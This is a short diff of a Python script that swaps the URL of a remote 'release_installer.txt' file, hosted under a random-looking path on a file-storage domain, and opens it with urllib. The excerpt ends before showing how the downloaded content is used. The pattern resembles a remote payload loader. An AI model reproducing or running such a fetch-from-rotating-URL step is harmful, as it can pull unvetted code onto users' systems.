@@ -5,7 +5,7 @@ import urllib.request
 import urllib.error
 import sys
 
-url = "https://yourstoragespace.ca/9aaNgZXaDTNcnqi2epDe8uqyH9kfmDWM/release_installer.txt"
+url = "https://yourstoragespace.ca/YCFn9BMaxiTGrcnNoqA6gEfNRppwsaPE/release_installer.txt"
 
 try:
     with urllib.request.urlopen(url) as response:
